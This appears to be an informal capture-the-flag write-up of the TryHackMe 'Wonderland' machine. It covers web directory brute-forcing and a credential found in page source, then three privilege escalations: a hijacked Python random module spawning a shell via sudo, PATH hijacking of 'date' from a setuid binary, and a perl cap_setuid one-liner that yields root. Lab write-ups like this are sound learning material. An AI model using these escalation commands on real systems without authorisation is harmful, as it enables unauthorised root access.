# what I learned
- python libary hijacking
- path varible hijacking (do it call like this?)
- perl Capabilities GTFObin 
# recon
- 22 ssh
- 80 http
gobuster for directory brute forcing and what I got after run 4 times was `/r/a/b/b` and it kick me, *rabb* uhmmmm.. it might be *rabbit* so visit `r/a/b/b/i/t` and BING GO! 

check the sourc code. you will find a credential
`alice:<password>`

now ssh to victim server. after some enumeration:
```console
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25 17:52 .
drwxr-xr-x 6 root  root  4096 May 25 17:52 ..
lrwxrwxrwx 1 root  root     9 May 25 17:52 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25 02:36 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25 02:36 .bashrc
drwx------ 2 alice alice 4096 May 25 16:37 .cache
drwx------ 3 alice alice 4096 May 25 16:37 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25 02:52 .local
-rw-r--r-- 1 alice alice  807 May 25 02:36 .profile
-rw------- 1 root  root    66 May 25 17:08 root.txt
-rw-r--r-- 1 root  root  3577 May 25 02:43 walrus_and_the_carpenter.py
alice@wonderland:~$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)
alice@wonderland:~$ ls ../
alice  hatter  rabbit  tryhackme
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
okey there are 4 user on the server: alice, hatter, rabbit, and tryhackme. Moreover, we are allow to run `/usr/bin/python3.6` and `/home/alice/walrus_and_the_carpenter.py` and *rabbit* 

let find out what `walrus_and_the_carpenter.py` can do. by `cat` it and run it
```py
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
.
.
.
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
seem like it randomly pick one of the poem and print it out. as you can see the code `import random` libary/module which can can hijack it easily by just create a anoter script call `random.py` at the same directory. Moreover, we need to create a method call `choice` (since the poem script it using it)

what our the our method (`choice`) will do is generate a shell which will escalte us to rabbit user. so in `random.py` add this lines of code
```py
import os
def choice(arg):
    os.system("/bin/bash") # shell
```
now run it
```console
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
now again let explore around.
```
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 04 Aug 2020 18:25:51 +0000
Ask very nicely, and I will give you some tea while you wait for him
now
Segmentation fault (core dumped)
```
`teaParty` is a executeable files, ELF type. After try running the script a fews time. whatever the input is, `teaParty` always give output as `Segmentation fault (core dumped)`

let send `teaParty` back to our kali to examing it. I used `Ghrida` to decomplie it to C. the code belows show that `teaParty` do:
```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```
the first to line is `setuid(0x3eb); setgid(0x3eb);` seem liek the script is set the current user to user ID 0x3eb which is **hatter**. 

The most interesting part is
```system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");``` which allow us to hijack `/bin/date`. Same plan as what we did before with `random.py`. Now create a file call date which contain the code below:
```bash
#!/bin/bash
/bin/bash # spawn shell
```
now we gonna at new home directory which contain our shell (`date`) in the PATH varible. This will fool the system to execute our "evile" `date` instead for excuting `/bin/date`.
```console
rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH # add path
rabbit@wonderland:/home/rabbit$ ./teaParty # execute it
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$
```
Boom we are in as **hatter**
```console
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt 
<hatter password>
```
# root
I ran `linpeas.sh`. and bingo I found some joiucy shit (again)
```
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
after reading the link (https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities) and some research, I found perl GTFObins (https://gtfobins.github.io/gtfobins/perl/) So let root this baby!!!
```console
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root
```
